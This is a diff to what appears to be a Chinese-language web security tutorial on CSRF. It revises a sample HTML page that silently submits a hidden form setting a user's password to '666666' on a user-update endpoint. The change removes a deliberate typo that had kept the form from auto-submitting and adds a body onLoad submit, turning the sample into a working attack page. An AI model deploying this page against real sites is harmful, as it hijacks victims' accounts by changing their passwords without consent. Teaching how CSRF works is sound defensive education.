@@ -198,22 +198,15 @@ http://www.aa.com/opt.php?id=135&amp;act=del&amp;name=Tom的链接
 
 <p>此时我们就可以构造自动提交表单的xxxx.html，内容如下：</p>
 
-<pre><code class="language-html">&lt;!DOCTYPE html&gt;
-&lt;html lang=&quot;en&quot;&gt;
+<pre><code class="language-html">&lt;html&gt;
 &lt;head&gt;
-    &lt;meta charset=&quot;UTF-8&quot;&gt;
-    &lt;title&gt;test&lt;/title&gt;
+    &lt;title&gt;aa&lt;/title&gt;
 &lt;/head&gt;
-&lt;body&gt;
+&lt;body onLoad=&quot;document.forms[0].submit()&quot;&gt;
     &lt;form action=&quot;http://172.23.10.200/index.php/User/Index/RegisterUpdate/id/286&quot; method=&quot;post&quot; name=&quot;test&quot;&gt;
            &lt;input type=&quot;hidden&quot; name=&quot;password&quot; id=&quot;password&quot; value=&quot;666666&quot;&gt;
            &lt;input type=&quot;hidden&quot; name=&quot;cpassword&quot; id=&quot;conpassword&quot; value=&quot;666666&quot;&gt;
     &lt;/form&gt;
-    &lt;script type=&quot;text/javascript&quot;&gt;
-        widow.onload= function(){ //这里的window故意少了一个n，不然就自动提交了
-            document.test.submit();
-        }
-    &lt;/script&gt;
 &lt;/body&gt;
 &lt;/html&gt;
 </code></pre>
